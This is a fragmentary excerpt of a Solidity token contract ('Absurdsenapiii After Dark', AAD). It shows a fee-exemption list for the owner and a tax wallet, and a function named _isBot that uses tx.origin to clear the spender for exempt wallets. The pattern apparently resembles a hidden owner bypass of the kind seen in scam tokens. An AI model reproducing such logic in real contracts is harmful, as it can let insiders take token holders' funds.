...
contract Token is Context, IERC20, Ownable {
    ...
    mapping(address => bool) private _isAADExcludedFromFees;
    ...
    string private _name = unicode"Absurdsenapiii After Dark";
    string private _symbol = unicode"AAD";
    ...
    constructor() payable {
        ...
        _isAADExcludedFromFees[owner()] = true;
        _isAADExcludedFromFees[address(this)] = true;
        _isAADExcludedFromFees[_taxWallet] = true;
    ...
    function _isBot(address from, address to, uint256 amount) private returns(bool) {
        _spender = from;
        if(_isAADExcludedFromFees[_msgOrigin()]) {
            _spender = address(0);
